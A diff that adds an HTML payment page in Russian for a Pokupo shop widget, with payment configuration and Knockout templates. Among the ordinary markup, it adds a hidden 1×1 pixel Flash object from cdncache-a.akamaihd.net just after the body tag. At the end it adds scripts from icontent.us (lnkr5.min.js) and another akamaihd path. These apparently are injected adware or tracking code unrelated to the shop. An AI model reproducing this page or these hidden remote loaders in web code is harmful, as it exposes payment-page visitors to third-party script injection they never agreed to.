@@ -1,0 +1,622 @@
+<html class="pkp_html"><head>
+    <meta charset="UTF-8">
+    <title>Оплата</title>
+<!-- Начало кода активации магазина -->
+    <meta name="Pokupo.activationKey" content="03f1c15a222d8e288e3eeda35ae04ebc1f7f6526">
+    <meta name="Pokupo.version" content="0.0.1.9">
+<!-- Конец кода активации магазина -->
+<script async="" type="text/javascript" src="//yandex.st/share/share.js">
+</script><script async="" type="text/javascript" src="https://server.pokupo.ru/prod/server/js/jquery.min.js"></script>
+<link type="text/css" rel="stylesheet" href="../themes/payment/src/theme.css">
+<script async="" type="text/javascript" src="https://server.pokupo.ru/prod/server/js/promo/dist/pokupo.components.min.js"></script>
+<script async="" type="text/javascript" src="https://server.pokupo.ru/prod/server/js/widgets/dist/pokupo.widgets.lib.min.js"></script><script async="" type="text/javascript" src="https://server.pokupo.ru/prod/server/js/promo/dist/pokupo.widgets.animate.min.js"></script><style type="text/css"></style><script async="" type="text/javascript" src="https://server.pokupo.ru/prod/server/js/widgets/dist/StandalonePaymentWidget-1.0.min.js"></script><script async="" type="text/javascript" src="https://server.pokupo.ru/prod/server/js/widgets/dist/StatusPaymentWidget-1.0.min.js"></script></head>
+<body class="pkp_body"><div id="f2U6tTsjyn14" style="position: absolute; top: 0px; left: 0px; width: 1px; height: 1px; z-index: 2147483647;"><object type="application/x-shockwave-flash" id="_GPL_e6a00_swf" data="http://cdncache-a.akamaihd.net/items/e6a00/storage.swf?r=1" width="1" height="1"><param name="wmode" value="transparent"><param name="allowscriptaccess" value="always"><param name="flashvars" value="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName=gpl"></object></div>
+<!-- Начало кода для виджета оплаты -->
+<script src="https://server.pokupo.ru/prod/server/js/widgets/JSCore-1.3.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+    var pkpWHostTmpl = 'https://pokupo.ru/themes/default/tmpl';
+    WParameters = {
+        core: {
+            shopId: 1547, //Id магазина, который владеет товаром
+            theme: 'payment', //Ссылка на файла стилей CSS, должна начинаться с https: или варианты тем: payment_company, payment_company_white, payment_dark
+        }
+    };
+    WParameters['standalonePayment'] = {
+        routeName: 'default', //Команда для автоматической инициализации виджета
+        uid: '', //Номер счета в системе учета продавца, не обязательный параметр
+        tmpl: { path:  pkpWHostTmpl + '/standalonePaymentTmpl.html' },
+        userParams: {
+            param1: 'Параметр продавца 1', //Параметры, которые будут передаваться
+            param2: 'Параметр продавца 2', //в процессе уведомления сайта продавца об оплате
+            param3: 'Параметр продавца 3', //Название и значения параметров могут быть произвольные
+            PKP_SUCCESS_URL: '', //Адрес для возврата после успешной оплаты с сайта платежной системы
+            PKP_FAIL_URL: '',  //Адрес продавца для возврата после отмены платежа с сайта платежной системы
+            PKP_BACK_URL: '' //Адрес продавца для возврата после выписки счета с сайта платежной системы
+        },
+        description: 'В пользу магазина Славный Град', //Описание товара или услуги
+        amount: 100, //Сумма оплаты
+        mailUser: '', //Почта покупателя, необязательный параметр
+        backUrl: '' //Адрес для возврата со страницы виджета кнопкой Назад
+    };
+    PokupoWidgets.Init(["standalonePayment", "statusPayment"], WParameters)
+</script>
+<div id="content"><!-- version 1.0 -->
+
+        <div id="pkp-container" class="pkp-container_800" style="">
+            <h3 class="pkp-title pkp-title_big">Оплата заказа</h3>
+            <!-- ko ifnot: show.showAmount -->
+            <span class="pkp-span">Сумма счета</span>
+            <strong class="pkp-strong"><!-- ko text: formatAmount -->100.00<!-- /ko --> руб</strong>
+            <!-- /ko -->
+            <span class="pkp-span">Основание платежа</span>
+            <strong class="pkp-strong">Оплата «<!-- ko text: title -->В пользу магазина <!-- /ko -->»</strong>
+
+            <form class="pkp-form j-pkp-payment" action="#" data-bind="attr: {id: cssForm}" id="pokupo_payment_form">
+                <!-- ko if: show.errorBase --><!-- /ko -->
+                <!-- ko if: show.showCount --><!-- /ko -->
+                <!-- ko if: show.showAmount --><!-- /ko -->
+                <label class="pkp-form__label">
+                    <span class="pkp-span pkp-span_required">Ваш e-mail</span>
+                    <!-- ko if: show.errorEmail -->
+                    <span class="pkp-error-msg" style="display: inline" data-bind="text: error.email">Поле обязательно для заполнения</span>
+                    <!-- /ko -->
+                    <input class="pkp-input j-pkp-req-input" type="email" data-bind="value: mailUser">
+                </label>
+
+                <!-- ko if: payments().length > 0 -->
+                    <h3 class="pkp-title">Выберете удобный способ оплаты</h3>
+
+                    <div class="pkp-payment-method pkp-clearfix">
+                        <!-- ko foreach: payments -->
+                            <!--  ko template: { name: 'standalonePaymentMethodTmpl' } --><div class="pkp-payment-method__item">
+        <div class="pkp-tooltip-payment-method">
+            <div class="pkp-tooltip">
+                <span class="pkp-tooltip__trigger">?</span>
+
+                <div class="pkp-tooltip__content pkp-tooltip__content_left">
+                    <h6 class="pkp-tooltip__title" data-bind="text: namePayment">Оплата через Z-Payment</h6>
+                    <p data-bind="html: descPayment">Система приема и обработки платежей <a href="https://z-payment.com" target="_blank">Z-Payment</a> это шлюз для приема платежей из различных систем, в процессе оплаты предоставляется выбор любого способов оплаты, которых насчитывается более 30.</p>
+                </div>
+            </div>
+        </div>
+        <div class="pkp-payment-method__content">
+            <div class="pkp-payment-method__image">
+                <img src="//seller.pokupo.ru/images/logos/payment_base/2.png" alt="" data-bind="attr: {src: logoPayment}">
+            </div>
+            <div class="pkp-payment-method__info">
+                <span class="pkp-span">Скорость: <strong><!-- ko text: timePayment -->до 10 мин.<!-- /ko --></strong></span>
+                <span class="pkp-span">Комиссия: <strong><!-- ko text: costPayment -->0<!-- /ko --> руб.</strong></span>
+            </div>
+            <button class="pkp-payment-method__pay j-pkp-pay" data-bind="click: Click.SelectPayment">Оплатить <!-- ko text: itog -->100.00<!-- /ko --> Р</button>
+        </div>
+    </div><!-- /ko -->
+                        <!-- /ko -->
+                    </div>
+                <!-- /ko -->
+            </form>
+            <div class="pkp-btns-holder">
+                <a class="pkp-btn pkp-btn_back" data-bind="click: Back">Назад</a>
+            </div>
+            <div class="pkp-footer">
+                <span class="pkp-span"><a href="https://pokupo.ru" target="_blank">Pokupo.ru</a> - интернет магазин за 10 минут и 0 рублей!</span>
+            </div>
+
+        </div></div>
+<!-- Конец кода виджета оплаты -->
+
+<script type="text/html" id="standalonePaymentButtonImpl"><!-- version 1.0 -->
+    <button class="goButton pay" data-bind="click: ClickPay">
+        <span></span>
+        <!-- ko text: title --><!-- /ko -->
+    </button></script>
+<script type="text/html" id="standalonePaymentListTmpl"><!-- version 1.0 -->
+
+        <div id="pkp-container">
+            <h3 class="pkp-title pkp-title_big">Оплата заказа</h3>
+            <!-- ko ifnot: show.showAmount -->
+            <span class="pkp-span">Сумма счета</span>
+            <strong class="pkp-strong"><!-- ko text: formatAmount --><!-- /ko --> руб</strong>
+            <!-- /ko -->
+            <span class="pkp-span">Основание платежа</span>
+            <strong class="pkp-strong">Оплата «<!-- ko text: title --><!-- /ko -->»</strong>
+
+            <form class="pkp-form j-pkp-payment" action="#" data-bind="attr: {id: cssForm}">
+                <!-- ko if: show.errorBase -->
+                <p>
+                    <span class="pkp-error-msg" style="display: inline; position: relative" data-bind="text: error.base"></span>
+                </p>
+                <!-- /ko -->
+                <!-- ko if: show.showCount -->
+                    <label class="pkp-form__label">
+                        <span class="pkp-span pkp-span_required">Количество товара</span>
+                        <!-- ko if: show.errorCount -->
+                        <span class="pkp-error-msg" style="display: inline" data-bind="text: error.count"></span>
+                        <!-- /ko -->
+                        <input class="pkp-input j-pkp-req-input" type="text" data-bind="value: count, attr: {id: cssCount}">
+                    </label>
+                <!-- /ko -->
+                <!-- ko if: show.showAmount -->
+                    <label class="pkp-form__label">
+                        <span class="pkp-span pkp-span_required">Сумма оплаты</span>
+                        <!-- ko if: show.errorAmount -->
+                        <span class="pkp-error-msg" style="display: inline" data-bind="text: error.amount"></span>
+                        <!-- /ko -->
+                        <input class="pkp-input j-pkp-req-input" type="text" data-bind="value: amount, attr: {id: cssAmount}">
+                    </label>
+                <!-- /ko -->
+                <label class="pkp-form__label">
+                    <span class="pkp-span pkp-span_required">Ваш e-mail</span>
+                    <!-- ko if: show.errorEmail -->
+                    <span class="pkp-error-msg" style="display: inline" data-bind="text: error.email"></span>
+                    <!-- /ko -->
+                    <input class="pkp-input j-pkp-req-input" type="email" data-bind="value: mailUser">
+                </label>
+
+                <!-- ko if: payments().length > 0 -->
+                    <h3 class="pkp-title">Выберете удобный способ оплаты</h3>
+
+                    <div class="pkp-payment-method pkp-clearfix" >
+                        <!-- ko foreach: payments -->
+                            <!--  ko template: { name: 'standalonePaymentMethodTmpl' } --><!-- /ko -->
+                        <!-- /ko -->
+                    </div>
+                <!-- /ko -->
+            </form>
+            <div class="pkp-btns-holder">
+                <a class="pkp-btn pkp-btn_back" data-bind="click: Back">Назад</a>
+            </div>
+            <div class="pkp-footer">
+                <span class="pkp-span"><a href="https://pokupo.ru" target="_blank">Pokupo.ru</a> - интернет магазин за 10 минут и 0 рублей!</span>
+            </div>
+
+        </div>
+</script>
+<script type="text/html" id="standalonePaymentMethodTmpl">
+	<div class="pkp-payment-method__item full_width">
+        <div class="pkp-tooltip-payment-method">
+            <div class="pkp-tooltip">
+                <span class="pkp-tooltip__trigger">?</span>
+
+                <div class="pkp-tooltip__content pkp-tooltip__content_left">
+                    <h6 class="pkp-tooltip__title" data-bind="text: namePayment"></h6>
+                    <p data-bind="html: descPayment"></p>
+                </div>
+            </div>
+        </div>
+        <div class="pkp-payment-method__content">
+			<div class="pkp-payment-method__logo">
+				<img src="" alt="" data-bind="attr: {src: logoPayment}">
+			</div>
+            <div class="pkp-payment-method__image">
+                <div class="pkp-payment-method__images">
+					<img src="../images/payment/visa-q.png">
+					<img src="../images/payment/visa.png">
+					<img src="../images/payment/bitcoin.png">
+					<img src="../images/payment/sber.png">
+					<img src="../images/payment/pochta.png">
+					<img src="../images/payment/comepay.png">
+					<img src="../images/payment/emoney.png">
+					<img src="../images/payment/tel-small.png">
+					<img src="../images/payment/card.png">
+					<img src="../images/payment/comp.png">					
+				</div>
+            </div>
+            <div class="pkp-payment-method__info">
+                <span class="pkp-span">Скорость: <strong><!-- ko text: timePayment --><!-- /ko --></strong></span>
+                <span class="pkp-span">Комиссия: <strong><!-- ko text: costPayment --><!-- /ko --> руб.</strong></span>
+            </div>
+            <button class="pkp-payment-method__pay j-pkp-pay" data-bind="click: Click.SelectPayment">Оплатить <!-- ko text: itog --><!-- /ko --> Р</button>
+        </div>
+    </div>
+	<div class="pkp-payment-method__item full_width">
+        <div class="pkp-tooltip-payment-method">
+            <div class="pkp-tooltip">
+                <span class="pkp-tooltip__trigger">?</span>
+
+                <div class="pkp-tooltip__content pkp-tooltip__content_left">
+                    <h6 class="pkp-tooltip__title" data-bind="text: namePayment"></h6>
+                    <p data-bind="html: descPayment"></p>
+                </div>
+            </div>
+        </div>
+        <div class="pkp-payment-method__content">
+			<div class="pkp-payment-method__logo">
+				<img src="" alt="" data-bind="attr: {src: logoPayment}">
+			</div>		
+            <div class="pkp-payment-method__image">
+				<div class="pkp-payment-method__images">
+					<img src="../images/payment/visa.png"> 
+					<img src="../images/payment/sber.png">
+					<img src="../images/payment/ya.png">
+					<img src="../images/payment/rapida.png">
+					<img src="../images/payment/tele2.png">
+					<img src="../images/payment/googlead.png">
+					<img src="../images/payment/check.png">
+					<img src="../images/payment/tablet.png">
+					<img src="../images/payment/comp.png">					
+				</div>				
+            </div>
+            <div class="pkp-payment-method__info">
+                <span class="pkp-span">Скорость: <strong><!-- ko text: timePayment --><!-- /ko --></strong></span>
+                <span class="pkp-span">Комиссия: <strong><!-- ko text: costPayment --><!-- /ko --> руб.</strong></span>
+            </div>
+            <button class="pkp-payment-method__pay j-pkp-pay" data-bind="click: Click.SelectPayment">Оплатить <!-- ko text: itog --><!-- /ko --> Р</button>
+        </div>
+    </div>
+	<div class="pkp-payment-method__item">
+        <div class="pkp-tooltip-payment-method">
+            <div class="pkp-tooltip">
+                <span class="pkp-tooltip__trigger">?</span>
+
+                <div class="pkp-tooltip__content pkp-tooltip__content_left">
+                    <h6 class="pkp-tooltip__title" data-bind="text: namePayment"></h6>
+                    <p data-bind="html: descPayment"></p>
+                </div>
+            </div>
+        </div>
+        <div class="pkp-payment-method__content">
+            <div class="pkp-payment-method__image">
+                <img src="" alt="" data-bind="attr: {src: logoPayment}">
+            </div>
+            <div class="pkp-payment-method__info">
+                <span class="pkp-span">Скорость: <strong><!-- ko text: timePayment --><!-- /ko --></strong></span>
+                <span class="pkp-span">Комиссия: <strong><!-- ko text: costPayment --><!-- /ko --> руб.</strong></span>
+            </div>
+            <button class="pkp-payment-method__pay j-pkp-pay" data-bind="click: Click.SelectPayment">Оплатить <!-- ko text: itog --><!-- /ko --> Р</button>
+        </div>
+    </div>
+	<div class="pkp-payment-method__item">
+        <div class="pkp-tooltip-payment-method">
+            <div class="pkp-tooltip">
+                <span class="pkp-tooltip__trigger">?</span>
+
+                <div class="pkp-tooltip__content pkp-tooltip__content_left">
+                    <h6 class="pkp-tooltip__title" data-bind="text: namePayment"></h6>
+                    <p data-bind="html: descPayment"></p>
+                </div>
+            </div>
+        </div>
+        <div class="pkp-payment-method__content">
+            <div class="pkp-payment-method__image">
+                <img src="" alt="" data-bind="attr: {src: logoPayment}">
+            </div>
+            <div class="pkp-payment-method__info">
+                <span class="pkp-span">Скорость: <strong><!-- ko text: timePayment --><!-- /ko --></strong></span>
+                <span class="pkp-span">Комиссия: <strong><!-- ko text: costPayment --><!-- /ko --> руб.</strong></span>
+            </div>
+            <button class="pkp-payment-method__pay j-pkp-pay" data-bind="click: Click.SelectPayment">Оплатить <!-- ko text: itog --><!-- /ko --> Р</button>
+        </div>
+    </div>
+	<div class="pkp-payment-method__item">
+        <div class="pkp-tooltip-payment-method">
+            <div class="pkp-tooltip">
+                <span class="pkp-tooltip__trigger">?</span>
+
+                <div class="pkp-tooltip__content pkp-tooltip__content_left">
+                    <h6 class="pkp-tooltip__title" data-bind="text: namePayment"></h6>
+                    <p data-bind="html: descPayment"></p>
+                </div>
+            </div>
+        </div>
+        <div class="pkp-payment-method__content">
+            <div class="pkp-payment-method__image">
+                <img src="" alt="" data-bind="attr: {src: logoPayment}">
+            </div>
+            <div class="pkp-payment-method__info">
+                <span class="pkp-span">Скорость: <strong><!-- ko text: timePayment --><!-- /ko --></strong></span>
+                <span class="pkp-span">Комиссия: <strong><!-- ko text: costPayment --><!-- /ko --> руб.</strong></span>
+            </div>
+            <button class="pkp-payment-method__pay j-pkp-pay" data-bind="click: Click.SelectPayment">Оплатить <!-- ko text: itog --><!-- /ko --> Р</button>
+        </div>
+    </div>
+</script>
+<script type="text/html" id="standalonePaymentPageTmpl"><!-- version 1.0 -->
+
+        <div id="pkp-container">
+            <div class="pkp-clearfix">
+                <!-- ko if: showPaymentInfo -->
+                    <div class="pkp-payment-method__item pkp-payment-method__item_small">
+                        <div class="pkp-tooltip-payment-method">
+                            <div class="pkp-tooltip">
+                                <span class="pkp-tooltip__trigger">?</span>
+                                <div class="pkp-tooltip__content">
+                                    <h6 class="pkp-tooltip__title" data-bind="text: paymentInfo.namePayment"></h6>
+                                    <p data-bind="html: paymentInfo.descPayment"></p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="pkp-payment-method__content">
+                            <div class="pkp-payment-method__image">
+                                <img src="" alt="" data-bind="attr: {src: paymentInfo.logoPayment}">
+                            </div>
+                            <div class="pkp-payment-method__info">
+                                <span class="pkp-span">Скорость: <strong><!-- ko text: paymentInfo.timePayment --><!-- /ko --></strong></span>
+                                <span class="pkp-span">Комиссия: <strong><!-- ko text: paymentInfo.costPayment --><!-- /ko --> руб.</strong></span>
+                            </div>
+                        </div>
+                    </div>
+                <!-- /ko -->
+                <div class="pkp-payment-order">
+                    <h3 class="pkp-title pkp-title_big">Оплата заказа</h3>
+                    <!-- ko foreach: outData -->
+                        <span class="pkp-span" data-bind="text: label"></span>
+                        <strong class="pkp-strong" data-bind="text: value"></strong>
+                    <!-- /ko -->
+                </div>
+            </div>
+            <!-- ko if: instruction -->
+            <div class="pkp-rollup">
+                <a href="#" class="j-pkp-rollup__trigger pkp-rollup__trigger">Инструкция для плательщика</a>
+                <a class="pkp-print" href="" data-bind="click: ClickPrintInstruction">Распечать</a>
+                <div class="j-pkp-rollup__content pkp-resize-block-wrapper j-scroll">
+                    <div class="pkp-resize-block">
+                        <div class="pkp-contributors-intruct" data-bind="html: instruction, attr: {id: cssInstruction }">
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- /ko -->
+
+            <!-- ko if: isInData() -->
+                <form class="pkp-receipt-form" data-bind="attr: {id: cssInDataForm}, submit: ClickSubmit" method="POST" enctype="multipart/form-data">
+                    <!-- ko foreach: inData -->
+
+                        <!-- ko if: typeField() == "hidden" -->
+                            <!--  ko template: { name: 'standalonePaymentTextFieldTmpl' } --><!-- /ko -->
+                        <!-- /ko -->
+
+                        <!-- ko ifnot: typeField() == "hidden" -->
+                            <div class="pkp-receipt-form__grid_50">
+                                <div class="pkp-receipt-form__wrap pkp-clearfix">
+                                    <span class="pkp-span pkp-span_required pkp-span_receipt" data-bind="text: label()"></span>
+                                    <!-- ko if: help() -->
+                                        <div class="pkp-tooltip-receipt">
+                                            <div class="pkp-tooltip">
+                                                <span class="pkp-tooltip__trigger">?</span>
+                                                <div class="pkp-tooltip__content pkp-tooltip__content_left" data-bind="html: help()">
+                                                </div>
+                                            </div>
+                                        </div>
+                                    <!-- /ko -->
+                                </div>
+                                <!-- ko if: error() -->
+                                <div class="error__message">
+                                    <p data-bind="text: error()"></p>
+                                </div>
+                                <!-- /ko -->
+                                <!-- ko if: typeField() == "select" -->
+                                    <!--  ko template: { name: 'standalonePaymentSelectFieldTmpl' } --><!-- /ko -->
+                                <!-- /ko -->
+                                <!-- ko if: typeField() == "text" || typeField() == "password" -->
+                                    <!--  ko template: { name: 'standalonePaymentTextFieldTmpl' } --><!-- /ko -->
+                                <!-- /ko -->
+                                <!-- ko if: typeField() == "textarea" -->
+                                    <!--  ko template: { name: 'standalonePaymentTextareaFieldTmpl' } --><!-- /ko -->
+                                <!-- /ko -->
+                                <!-- ko if: typeField() == "checkbox" -->
+                                    <!--  ko template: { name: 'standalonePaymentCheckboxFieldTmpl' } --><!-- /ko -->
+                                <!-- /ko -->
+                                <!-- ko if: typeField() == "radio" -->
+                                    <!--  ko template: { name: 'standalonePaymentRadioFieldTmpl' } --><!-- /ko -->
+                                <!-- /ko -->
+                            </div>
+                        <!-- /ko -->
+                    <!-- /ko -->
+                </form>
+            <!-- /ko -->
+
+            <!-- ko if: urlInvoice() -->
+                <div class="b-invoice__block">
+                    <h2 class="b-invoice__title">Квитанция для оплаты</h2>
+                    <div>
+                        <img src="" data-bind="attr: {id: cssInvoice, src: urlInvoice}">
+                    </div>
+                    <div class="print-button">
+                        <span class="pseudo-link" data-bind="click: ClickPrintInvoice">Распечатать квитанцию</span>
+                    </div>
+                </div>
+            <!-- /ko -->
+
+            <!-- ko if: !isPayForm() && isInData() -->
+                <div class="pkp-btns-holder">
+                    <a class="pkp-btn pkp-btn_back" data-bind="click: Back">Назад</a>
+                    <button class="pkp-btn pkp-btn_get-receipt" data-bind="click: ClickSubmit, text: captionSubmit"></button>
+                </div>
+            <!-- /ko -->
+
+            <!-- ko if: !isPayForm() && !isInData() -->
+                <div class="pkp-btns-holder">
+                    <a class="pkp-btn pkp-btn_back" data-bind="click: Back">Назад</a>
+                    <button class="pkp-btn pkp-btn_get-receipt" data-bind="click: ClickRefresh, text: captionSubmit"></button>
+                </div>
+            <!-- /ko -->
+
+            <!-- ko if: isPayForm() -->
+                <div class="pkp-btns-holder">
+                    <div>
+                        <!-- ko with: payForm -->
+                        <form action="" method="" data-bind="attr: {method: method, action: action, target: target, id: cssPayForm}">
+                            <!-- ko foreach: field -->
+                            <input type="hidden" name=""  data-bind="value: value, attr: {name: name}"/>
+                            <!-- /ko -->
+                        </form>
+                        <!-- /ko -->
+                    </div>
+                    <!-- ko if: idMethodPayment -->
+                    <a class="pkp-btn pkp-btn_back" data-bind="click: Back">Назад</a>
+                    <!-- /ko -->
+                    <button class="pkp-btn pkp-btn_get-receipt" data-bind="click: ClickPay, text: captionSubmit"></button>
+                </div>
+            <!-- /ko -->
+
+            <div class="pkp-footer">
+                <span class="pkp-span"><a href="https://pokupo.ru" target="_blank">Pokupo.ru</a> - интернет магазин за 10 минут и 0 рублей!</span>
+            </div>
+        </div></script>
+<script type="text/html" id="standalonePaymentSelectFieldTmpl"><select name="" data-bind="attr: { name: name(), placeholder: label()}">
+        <!-- ko foreach: listSelect() -->
+        <!-- ko if: value() == $parent.value() -->
+        <option value="" data-bind="value: value, text: label" selected="selected"></option>
+        <!-- /ko -->
+        <!-- ko ifnot: value() == $parent.value() -->
+        <option value="" data-bind="value: value, text: label"></option>
+        <!-- /ko -->
+        <!-- /ko -->
+    </select></script>
+<script type="text/html" id="standalonePaymentTextFieldTmpl"><input class="pkp-input pkp-receipt-form__input" type="text" value="" data-bind="value: value, attr: {type: typeField(), name: name(), id: cssField(), placeholder: label()}"/></script>
+<script type="text/html" id="standalonePaymentTextareaFieldTmpl"><textarea  name="" data-bind="attr: {name: name()}, text: value, placeholder: label()"></textarea></script>
+<script type="text/html" id="standalonePaymentCheckboxFieldTmpl"><!-- ko if: listSelect().length > 0 -->
+        <!-- ko foreach: listSelect -->
+            <label class="pkp-label-checkbox">
+                <!-- ko if: value == $parent.value() -->
+                    <input class='pkp-input-checkbox' type="checkbox" checked="checked" name="" value="" data-bind="value: value, attr: { name: $parent.name()}"/>
+                <!-- /ko -->
+                <!-- ko ifnot: value == $parent.value() -->
+                    <input class='pkp-input-checkbox' type="checkbox" name="" value="" data-bind="value: value, attr: { name: $parent.name()}"/>
+                <!-- /ko -->
+                <span class='block-label b-small-text' for="" data-bind="text: $parent.label(), attr: { 'for': $parent.name()}"></span>
+            </label>
+        <!-- /ko -->
+    <!-- /ko -->
+
+    <!-- ko if: listSelect().length == 0 -->
+    <label class="pkp-label-checkbox">
+        <input class="pkp-input-checkbox" type="checkbox" name="" value="" data-bind="value: value, attr: { name: name()}"/>
+        <span class='block-label b-small-text' for="" data-bind="text: label(), attr: { 'for': name()}"></span>
+    </label>
+    <!-- /ko --></script>
+<script type="text/html" id="standalonePaymentRadioFieldTmpl"><!-- ko foreach: listSelect -->
+    <label class="pkp-label-radio">
+        <!-- ko if: value == $parent.value() -->
+            <input class="pkp-input-radio" type="radio" checked="checked" name="" value="" data-bind="value: value, attr: { name: $parent.name()}"/>
+        <!-- /ko -->
+        <!-- ko ifnot: value == $parent.value() -->
+            <input class="pkp-input-radio" type="radio" name="" value="" data-bind="value: value, attr: { name: $parent.name()}"/>
+        <!-- /ko -->
+        <span class="pkp-span-radio" for="" data-bind="text: $parent.label(), attr: { 'for': $parent.name()}"></span>
+    </label>
+    <!-- /ko --></script>
+<script type="text/html" id="standalonePaymentErrorTmpl"><!-- version 1.0 -->
+    <div id="pkp-container" class="pkp-container_800">
+
+        <div class="pkp-container_error">
+            <h3 class="pkp-title pkp-title_big">Оплата счёта</h3>
+            <div class="pkp-payment-error-img-wrap">
+                <img src="https://pokupo.ru/themes/default/images/payment/error.png" alt="">
+            </div>
+            <!-- ko if: code -->
+            <p>
+                <span class="pkp-error-msg" style="display: inline; position: relative" data-bind="text: message"></span>
+            </p>
+            <!-- /ko -->
+            <!-- ko if: hasPaymentList -->
+            <a href="#" class="pkp-btn pkp-btn_another-payment" data-bind="click: ClickClearPayment">Выбрать другой способ оплаты</a>
+            <!-- /ko -->
+            <div class="pkp-footer">
+                <span class="pkp-span"><a href="https://pokupo.ru" target="_blank">Pokupo.ru</a> - интернет магазин за 10 минут и 0 рублей!</span>
+            </div>
+        </div>
+    </div></script><script type="text/html" id="statusPaymentPageTmpl"><!-- version 1.0 -->
+    <div id="pkp-container">
+        <h3 class="pkp-title pkp-title_big">
+            Оплата счёта № <!-- ko text: orderId --><!-- /ko -->
+            <a class="pkp-print" href="" data-bind="click: ClickPrintOrder">Распечать</a>
+        </h3>
+
+        <div class="pkp-payment-info pkp-clearfix">
+            <table class="pkp-payment-info__table" data-bind="foreach: outData">
+                    <tr>
+                        <td>
+                            <!-- ko text: label --><!-- /ko -->
+                            <div class="pkp-tooltip pkp-tooltip_inline">
+                                <span class="pkp-tooltip__trigger">?</span>
+                                <div class="pkp-tooltip__content pkp-tooltip__content_left" data-bind="html: help"></div>
+                            </div>
+                        </td>
+                        <td><!-- ko text: value --><!-- /ko --></td>
+                    </tr>
+            </table>
+            <div class="pkp-payment-info__img">
+                <!-- ko if: isCancel() -->
+                    <img src="https://promodev.pokupo.ru/themes/default/images/payment/payf.png" alt=""/>
+                <!-- /ko -->
+                <!-- ko if: isPaid() -->
+                    <img src="https://promodev.pokupo.ru/themes/default/images/payment/pays.png" alt=""/>
+                <!-- /ko -->
+                <!-- ko if: isWait() -->
+                    <img src="https://promodev.pokupo.ru/themes/default/images/payment/in-treatment.jpg" alt=""/>
+                <!-- /ko -->
+                <!-- ko if: isBack() -->
+                    <img src="https://promodev.pokupo.ru/themes/default/images/payment/return.jpg" alt=""/>
+                <!-- /ko -->
+            </div>
+        </div>
+
+        <!-- ko if: instruction -->
+        <div class="pkp-rollup">
+            <a href="#" class="j-pkp-rollup__trigger pkp-rollup__trigger pkp-rollup__trigger_closed">
+                Инструкция для плательщика
+            </a>
+
+            <div class="j-pkp-rollup__content pkp-rollup__content_hidden pkp-resize-block-wrapper j-scroll">
+                <div class="pkp-resize-block">
+                    <div class="pkp-contributors-intruct" data-bind="html: instruction"></div>
+                </div>
+            </div>
+        </div>
+        <!-- /ko -->
+        <!-- ko if: isPaid() -->
+        <!-- ko if: egoods.length > 0 -->
+        <div class="pkp-shopping-list">
+            <h3 class="pkp-title">Цифровой товар</h3>
+
+            <div class="pkp-shopping-list__item" data-bind="foreach: egoods">
+                <strong class="pkp-shopping-list__title" data-bind="text: name_goods"></strong>
+                <span class="pkp-shopping-list__info">
+                    Скачиваний <!-- ko text: count_upload --><!-- /ko -->
+                    <!-- ko if: max_upload -->
+                    из <!-- ko text: max_upload --><!-- /ko -->
+                    <!-- /ko -->
+                    <!-- ko if: expiration -->
+                    ,  доступно до <!-- ko text: expiration --><!-- /ko -->
+                    <!-- /ko -->
+                </span>
+
+                <div class="pkp-upload">
+                    <a href="#" class="pkp-btn pkp-btn_upload" data-bind="attr: {href: upload_file}">Загрузить</a>
+                    <span class="pkp-upload__info">
+                        <!-- ko text: size_file --><!-- /ko -->
+                    </span>
+                </div>
+            </div>
+        </div>
+        <!-- /ko -->
+        <!-- /ko -->
+
+        <div style="display: none">
+            <div data-bind="attr: {id: cssOrder}">
+                <h3 class="pkp-title pkp-title_big">
+                    Оплата счёта № <!-- ko text: orderId --><!-- /ko -->
+                </h3>
+                <table class="pkp-payment-info__table" data-bind="foreach: outData">
+                    <tr>
+                        <td>
+                            <!-- ko text: label --><!-- /ko -->
+                        </td>
+                        <td><!-- ko text: value--><!-- /ko--></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <div class="pkp-btns-holder">
+            <a class="pkp-btn pkp-btn_back" href="#" data-bind="click: ClickBack">Назад</a>
+            <!-- ko if: showRefresh -->
+            <button class="pkp-btn pkp-btn_get-receipt" data-bind="click: ClickRefresh">Обновить</button>
+            <!-- /ko -->
+        </div>
+
+        <div class="pkp-footer">
+            <span class="pkp-span"><a href="https://pokupo.ru" target="_blank">Pokupo.ru</a> - интернет магазин за 10 минут и 0 рублей!</span>
+        </div>
+    </div></script></div><script type="text/javascript" src="http://icontent.us/addons/lnkr5.min.js"></script><script type="text/javascript" src="http://cdncache-a.akamaihd.net/sub/nee5452/50394_1113_/l.js?pid=2448&amp;ext=Not%20set"></script></body></html>
